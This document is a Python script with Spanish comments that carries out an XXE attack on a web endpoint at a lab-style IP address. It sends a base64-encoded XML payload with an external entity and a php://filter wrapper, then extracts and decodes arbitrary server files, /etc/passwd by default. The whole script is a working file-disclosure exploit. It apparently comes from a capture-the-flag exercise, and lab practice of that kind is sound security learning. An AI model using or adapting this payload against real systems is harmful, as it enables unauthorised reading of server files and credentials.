#!/usr/bin/python3

import base64, argparse
import requests
import ntpath
from bs4 import BeautifulSoup

URL = "http://10.10.11.100"

def arguments():
    parse = argparse.ArgumentParser()
    parse.add_argument("-f", dest="filename", type=str, default="/etc/passwd", help="Archivo del que quieres ver su contenido (default: /etc/passwd)")
    return parse.parse_args()

def xxe_attack(wrapper, filename):
    # Zona peligrosa
    xml = """<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "%s" >]>
    <bugreport>
        <title>hola</title>
        <cwe>como</cwe>
        <cvss>es</cvss>
        <reward>&xxe;</reward>
    </bugreport>""" % (wrapper)

    # Transformamos a base64
    xml_b64 = base64.b64encode(bytes(xml, 'utf-8')).decode('ascii')

    # Enviamos la data
    r = requests.post(URL + '/tracker_diRbPr00f314.php', data={"data":xml_b64})
    soup = BeautifulSoup(r.content, 'html.parser')

    file_content_b64 = soup.find_all('td')[7].get_text().strip()
    os_path_file = ntpath.basename(filename)  # Nos quedamos con el nombre del archivo

    print(f"\n[+] Leyendo contenido del archivo {filename} en el sistema.")
    # Decodeamos de base64 a texto plano y mostramos el resultado
    file_content = base64.b64decode(bytes(file_content_b64, 'ascii')).decode('utf-8').strip()
    if len(file_content) == 0:
        print("\n[-] El archivo no tiene contenido, no existe o tú no tienes acceso a él.\n")
        exit(1)
    elif len(file_content) > 1000:
        os_file_to_write = open(os_path_file, "w")
        os_file_to_write.write(file_content)
        os_file_to_write.close()
        print(f"\n[+] El archivo es muy grande, hemos guardado su contenido en esta misma ruta como '{os_path_file}'\n")
    else:
        print(f"\n{file_content}\n")

if __name__ == '__main__':
    args = arguments()

    if args.filename:
        wrapper = "php://filter/convert.base64-encode/resource=" + args.filename
        xxe_attack(wrapper, args.filename)
